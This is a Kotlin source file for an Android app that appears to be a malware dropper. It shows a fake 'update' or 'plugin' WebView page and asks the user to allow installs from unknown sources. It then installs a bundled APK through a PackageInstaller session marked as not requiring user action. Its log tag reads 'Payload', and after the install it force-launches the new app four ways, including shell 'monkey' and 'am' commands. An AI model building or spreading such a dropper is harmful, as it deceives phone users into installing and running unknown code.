package com.example.installer

import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.util.TypedValue
import android.view.View
import android.view.WindowInsetsController
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import java.io.File
import java.io.FileOutputStream

class MainActivity : Activity() {

    companion object {
        private const val TAG = "Payload"
        private const val APK_NAME = "main-app.apk"
        private const val REQUEST_INSTALL = 100
        private const val ACTION_INSTALL = "com.example.installer.INSTALL"
    }

    private lateinit var webView: WebView
    private var packageName: String? = null
    private var mainActivity: String? = null
    private val handler = Handler(Looper.getMainLooper())
    private var isInstalling = false

    private val installReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)

            when (status) {
                PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                    val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                    confirmIntent?.let { startActivity(it) }
                }

                PackageInstaller.STATUS_SUCCESS -> {
                    handler.post {
                        toast("✅ Installed!")
                    }

                    // ⭐ فوری باز کن - همین الان!
                    handler.postDelayed({
                        forceOpenApp()
                    }, 500) // فقط 0.5 ثانیه!
                }

                else -> {
                    handler.post {
                        isInstalling = false
                        toast("Installation failed")
                        // برگشت به صفحه اصلی
                        webView.loadUrl("file:///android_asset/update/update.html?error=true")
                    }
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // تنظیم Status Bar و Navigation Bar به سفید
        setupSystemBars()

        registerReceiver(installReceiver, IntentFilter(ACTION_INSTALL))

        // راه‌اندازی WebView
        webView = WebView(this).apply {
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                allowFileAccess = true
                allowContentAccess = true
                mediaPlaybackRequiresUserGesture = false
                javaScriptCanOpenWindowsAutomatically = true
            }

            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                }

                override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                    // اجازه بده همه URL ها داخل WebView لود بشن
                    return false
                }
            }

            webChromeClient = WebChromeClient()
        }

        // اضافه کردن JavaScript Interface
        webView.addJavascriptInterface(WebAppInterface(), "Android")

        // لود کردن صفحه اصلی
        webView.loadUrl("file:///android_asset/update/update.html")

        setContentView(webView)
    }

    // JavaScript Interface برای ارتباط HTML با Android
    inner class WebAppInterface {
        @JavascriptInterface
        fun installPlugin() {
            handler.post {
                if (!isInstalling) {
                    checkPermission()
                }
            }
        }

        @JavascriptInterface
        fun onInstallComplete() {
            handler.post {
                // بعد از نصب موفق، به صفحه اصلی برگرد
                webView.postDelayed({
                    webView.loadUrl("file:///android_asset/update/update.html?installed=true")
                }, 1000)
            }
        }
    }

    private fun checkPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                    data = Uri.parse("package:${this@MainActivity.packageName}")
                }
                startActivityForResult(intent, REQUEST_INSTALL)
                return
            }
        }
        install()
    }

    private fun install() {
        if (isInstalling) return
        isInstalling = true

        // نمایش صفحه نصب
        handler.post {
            webView.loadUrl("file:///android_asset/update/installing.html")
        }

        Thread {
            var session: PackageInstaller.Session? = null
            try {
                readApkInfo()

                if (packageName == null) {
                    handler.post {
                        isInstalling = false
                        toast("Cannot read APK")
                        webView.loadUrl("file:///android_asset/update/update.html?error=apk")
                    }
                    return@Thread
                }

                Log.d(TAG, "Package: $packageName")
                Log.d(TAG, "Activity: $mainActivity")

                val installer = packageManager.packageInstaller

                val params = PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL
                ).apply {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        setRequireUserAction(
                            PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED
                        )
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        setInstallReason(PackageManager.INSTALL_REASON_USER)
                    }
                }

                val sessionId = installer.createSession(params)
                session = installer.openSession(sessionId)

                session.openWrite("package", 0, -1).use { out ->
                    assets.open(APK_NAME).use { input ->
                        val buffer = ByteArray(65536)
                        var read: Int
                        while (input.read(buffer).also { read = it } != -1) {
                            out.write(buffer, 0, read)
                        }
                        session.fsync(out)
                    }
                }

                val intent = Intent(ACTION_INSTALL)

                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    PendingIntent.FLAG_MUTABLE
                } else {
                    PendingIntent.FLAG_UPDATE_CURRENT
                }

                val sender = PendingIntent.getBroadcast(
                    this@MainActivity, sessionId, intent, flags
                )

                session.commit(sender.intentSender)

            } catch (e: Exception) {
                Log.e(TAG, "Error", e)
                session?.abandon()
                handler.post {
                    isInstalling = false
                    toast("Failed!")
                    webView.loadUrl("file:///android_asset/update/update.html?error=install")
                }
            }
        }.start()
    }

    private fun readApkInfo() {
        try {
            val tempFile = File(cacheDir, "temp.apk")

            FileOutputStream(tempFile).use { out ->
                assets.open(APK_NAME).use { input ->
                    val buffer = ByteArray(8192)
                    var read: Int
                    while (input.read(buffer).also { read = it } != -1) {
                        out.write(buffer, 0, read)
                    }
                }
            }

            val info = packageManager.getPackageArchiveInfo(
                tempFile.absolutePath,
                PackageManager.GET_ACTIVITIES
            )

            info?.let {
                packageName = it.packageName
                // ⭐ Fix: ذخیره activities در متغیر local
                val activities = it.activities
                if (activities != null && activities.isNotEmpty()) {
                    mainActivity = activities[0].name
                }
            }

            tempFile.delete()

        } catch (e: Exception) {
            Log.e(TAG, "Read error", e)
        }
    }

    // ⭐⭐⭐ همه روش‌ها یکجا!
    private fun forceOpenApp() {
        Log.d(TAG, ">>> FORCE OPENING APP <<<")

        Thread {
            try {
                // صبر کوتاه
                Thread.sleep(800)

                // روش 1: Intent با ComponentName
                tryMethod1()
                Thread.sleep(300)

                // روش 2: Shell monkey
                tryMethod2()
                Thread.sleep(300)

                // روش 3: Shell am
                tryMethod3()
                Thread.sleep(300)

                // روش 4: getLaunchIntent
                tryMethod4()

                // بستن MainActivity بعد از باز کردن اپ
                handler.postDelayed({
                    finish()
                }, 1000)

            } catch (e: Exception) {
                Log.e(TAG, "Error", e)
            }
        }.start()
    }

    private fun tryMethod1() {
        try {
            Log.d(TAG, "[1] ComponentName Intent")

            if (packageName == null || mainActivity == null) return

            val intent = Intent().apply {
                component = ComponentName(packageName!!, mainActivity!!)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }

            startActivity(intent)
            Log.d(TAG, "[1] Success!")

        } catch (e: Exception) {
            Log.e(TAG, "[1] Failed: ${e.message}")
        }
    }

    private fun tryMethod2() {
        try {
            Log.d(TAG, "[2] Shell monkey")

            packageName ?: return

            val cmd = "monkey -p $packageName 1"
            val process = Runtime.getRuntime().exec(cmd)
            val exit = process.waitFor()

            Log.d(TAG, "[2] Exit: $exit")

        } catch (e: Exception) {
            Log.e(TAG, "[2] Failed: ${e.message}")
        }
    }

    private fun tryMethod3() {
        try {
            Log.d(TAG, "[3] Shell am")

            packageName ?: return

            val cmd = "am start -n $packageName/$mainActivity"
            val process = Runtime.getRuntime().exec(cmd)
            val exit = process.waitFor()

            Log.d(TAG, "[3] Exit: $exit")

        } catch (e: Exception) {
            Log.e(TAG, "[3] Failed: ${e.message}")
        }
    }

    private fun tryMethod4() {
        try {
            Log.d(TAG, "[4] getLaunchIntent")

            packageName ?: return

            val intent = packageManager.getLaunchIntentForPackage(packageName!!)

            intent?.let {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(it)
                Log.d(TAG, "[4] Success!")
            }

        } catch (e: Exception) {
            Log.e(TAG, "[4] Failed: ${e.message}")
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQUEST_INSTALL) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (packageManager.canRequestPackageInstalls()) {
                    install()
                } else {
                    toast("Permission denied")
                }
            }
        }
    }

    private fun setupSystemBars() {
        val window = window
        
        // تنظیم Status Bar و Navigation Bar به سفید
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11 (API 30) و بالاتر
            window.statusBarColor = Color.WHITE
            window.navigationBarColor = Color.WHITE
            
            val controller = window.insetsController
            controller?.let {
                // نمایش Status Bar icons به صورت تیره (برای خوانایی روی پس‌زمینه سفید)
                it.setSystemBarsAppearance(
                    WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS,
                    WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS
                )
                // نمایش Navigation Bar icons به صورت تیره
                it.setSystemBarsAppearance(
                    WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS,
                    WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS
                )
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            // Android 5.0 (API 21) تا Android 10 (API 29)
            window.statusBarColor = Color.WHITE
            window.navigationBarColor = Color.WHITE
            
            // برای Status Bar icons تیره
            var flags = window.decorView.systemUiVisibility
            flags = flags or View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
            flags = flags or View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR
            window.decorView.systemUiVisibility = flags
        }
    }

    override fun onBackPressed() {
        // اگر WebView می‌تونه back بره، بره
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(installReceiver)
            webView.destroy()
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun toast(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }

    private fun dp(d: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            d.toFloat(),
            resources.displayMetrics
        ).toInt()
    }
}